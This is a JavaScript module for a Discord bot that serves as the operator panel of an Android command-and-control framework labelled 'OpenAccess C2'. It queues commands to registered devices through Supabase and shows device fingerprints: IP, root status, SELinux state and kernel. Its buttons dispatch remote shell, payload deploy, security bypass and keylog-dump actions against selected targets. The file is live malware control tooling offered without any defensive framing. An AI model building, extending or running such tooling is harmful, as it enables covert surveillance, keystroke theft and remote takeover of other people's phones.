import { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder } from 'discord.js'

export async function sendCommand(supabase, deviceId, action, payload = {}) {
  const { data, error } = await supabase
    .from('commands')
    .insert({
      device_id: deviceId,
      action,
      payload,
      status: 'pending',
    })
    .select()
    .single()

  if (error) throw new Error(`Supabase insert failed: ${error.message}`)
  return data
}

export function commandSentEmbed(deviceId, action, commandId) {
  return new EmbedBuilder()
    .setColor(0x00f0ff)
    .setTitle('⚡ Command Dispatched')
    .addFields(
      { name: 'Action', value: `\`${action}\``, inline: true },
      { name: 'Target', value: `\`${(deviceId || '').slice(0, 20)}…\``, inline: true },
      { name: 'Command ID', value: `\`${(commandId || '').slice(0, 8)}…\``, inline: true },
    )
    .setFooter({ text: 'OpenAccess C2 • awaiting execution' })
    .setTimestamp()
}

export function errorEmbed(msg) {
  return new EmbedBuilder()
    .setColor(0xff3355)
    .setTitle('❌ Error')
    .setDescription(`\`\`\`${(msg || '').slice(0, 1500)}\`\`\``)
    .setTimestamp()
}

export function deviceEmbed(dev) {
  const online = dev.last_seen && (Date.now() - new Date(dev.last_seen).getTime() < 300000)
  return new EmbedBuilder()
    .setColor(online ? 0x00ff88 : 0xff3355)
    .setTitle(online ? '🟢 Device Online' : '🔴 Device Offline')
    .addFields(
      { name: 'Device ID', value: `\`${dev.device_id}\``, inline: false },
      { name: 'Model', value: dev.model || '?', inline: true },
      { name: 'Android', value: dev.android_ver || '?', inline: true },
      { name: 'Kernel', value: dev.kernel || '?', inline: true },
      { name: 'Root', value: dev.root_status || '?', inline: true },
      { name: 'SELinux', value: dev.selinux || '?', inline: true },
      { name: 'IP', value: dev.ip || '?', inline: true },
      { name: 'Last Seen', value: dev.last_seen ? new Date(dev.last_seen).toLocaleString('en-GB', { hour12: false }) : 'never', inline: true },
      { name: 'Modules', value: (dev.modules?.length ? dev.modules.join(', ') : 'none') || 'none', inline: false },
    )
    .setFooter({ text: 'OpenAccess C2' })
    .setTimestamp()
}

export function actionButtons(deviceId) {
  return new ActionRowBuilder()
    .addComponents(
      new ButtonBuilder().setCustomId(`c2:target:shell:${deviceId}`).setLabel('💻 Shell').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`c2:target:deploy:${deviceId}`).setLabel('📦 Deploy').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`c2:target:bypass:${deviceId}`).setLabel('🔓 Bypass').setStyle(ButtonStyle.Danger),
      new ButtonBuilder().setCustomId(`c2:target:keylog_dump:${deviceId}`).setLabel('⌨ Keylog').setStyle(ButtonStyle.Secondary),
      new ButtonBuilder().setCustomId(`c2:target:diagnostic:${deviceId}`).setLabel('🔍 Diag').setStyle(ButtonStyle.Secondary),
    )
}

export function deviceTable(devices) {
  if (!devices || devices.length === 0) return '```\nNo devices registered.\n```'

  const now = Date.now()
  const header = '#  ST  DEVICE ID          MODEL            ANDROID  AGO'
  const sep = '─'.repeat(62)
  const rows = devices.map((d, i) => {
    const online = d.last_seen && (now - new Date(d.last_seen).getTime() < 300000)
    const icon = online ? '🟢' : d.root_status === 'rooted' ? '🟡' : '🔴'
    const timeAgo = d.last_seen ? Math.floor((now - new Date(d.last_seen).getTime()) / 60000) : '—'
    const id = (d.device_id || '?').length > 16 ? (d.device_id || '?').slice(0, 16) + '…' : (d.device_id || '?')
    const model = ((d.model || '?').length > 14 ? (d.model || '?').slice(0, 14) + '…' : (d.model || '?')).padEnd(14)
    const ver = (d.android_ver || '?').padEnd(7)
    return `${String(i + 1).padStart(2)}  ${icon}  ${id.padEnd(16)}  ${model}  ${ver}  ${String(timeAgo).padStart(4)}m`
  }).join('\n')

  const total = devices.length
  const onlineCount = devices.filter(d => d.last_seen && (now - new Date(d.last_seen).getTime() < 300000)).length
  const rootedCount = devices.filter(d => d.root_status === 'rooted').length

  return `\`\`\`\n${header}\n${sep}\n${rows}\n${sep}\nTotal: ${total}  ·  Online: ${onlineCount}  ·  Rooted: ${rootedCount}\n\`\`\``
}

export function deviceSelectMenu(devices, placeholder = '🎯 Select a device...') {
  if (!devices || devices.length === 0) return null

  const now = Date.now()
  return new ActionRowBuilder()
    .addComponents(
      new StringSelectMenuBuilder()
        .setCustomId('c2:devices:select')
        .setPlaceholder(placeholder)
        .addOptions(
          devices.map(d => {
            const online = d.last_seen && (now - new Date(d.last_seen).getTime() < 300000)
            const id = d.device_id.length > 80 ? d.device_id.slice(0, 80) + '…' : d.device_id
            return {
              label: `${online ? '🟢' : '🔴'} ${(d.device_id || '?').slice(0, 24)}`,
              description: `${d.model || '?'} · ${d.android_ver || '?'} ${online ? '· ONLINE' : '· OFFLINE'}`.slice(0, 100),
              value: d.device_id,
            }
          })
        )
    )
}

export function paginationButtons(prefix, currentPage, totalPages) {
  return new ActionRowBuilder()
    .addComponents(
      new ButtonBuilder()
        .setCustomId(`c2:${prefix}:page:${currentPage - 1}`)
        .setLabel('◀ Prev')
        .setStyle(ButtonStyle.Secondary)
        .setDisabled(currentPage <= 1),
      new ButtonBuilder()
        .setCustomId(`c2:${prefix}:page:${currentPage + 1}`)
        .setLabel('Next ▶')
        .setStyle(ButtonStyle.Secondary)
        .setDisabled(currentPage >= totalPages),
      new ButtonBuilder()
        .setCustomId(`c2:${prefix}:refresh`)
        .setLabel('🔄 Refresh')
        .setStyle(ButtonStyle.Primary),
    )
}

// ── GIFs ────────────────────────────────────────────────────
const GIFS = {
  dashboard: [
    'https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHlzODF2eDFvNHM0dGxqdW11eTJrcDdjOWprNDJvbDZoZWJlMmExYiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/12wK5ab2fH2OLm/giphy.gif',
    'https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3pyeHY5ZzE4MDJvcWJqNnczeWkxb3Vzc2cwNHFoMTlrcXowNDZ0MCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/yCDoXaZyBVilq/giphy.gif',
    'https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExY2IwZzNvN3Exd21pMDI1Mmdwd3I5YXk0ajc5bG5pMnBxYnIwZXJsMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/tXlq0N4BafbEs/giphy.gif',
  ],
  target: [
    'https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExMzA5dXBqbWNuamx2aWRod2w2MHQ4MGJ4dnQ0YjIwdHhtenZjZ29zdyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/tptFQ8QAJYYvu/giphy.gif',
    'https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExY2IwZzNvN3Exd21pMDI1Mmdwd3I5YXk0ajc5bG5pMnBxYnIwZXJsMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/tXlq0N4BafbEs/giphy.gif',
  ],
  alert: 'https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExdnAzODdqNHAzZ3A4NjkycjZmZHF5Ym1haTk1OGUzZGhxZ25jY2ZtdyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/YmZOBDYBcmWK4/giphy.gif',
}

export function randomGif(category = 'dashboard') {
  const gifs = GIFS[category]
  if (!gifs) return GIFS.dashboard[0]
  if (!Array.isArray(gifs)) return gifs
  return gifs[Math.floor(Math.random() * gifs.length)]
}
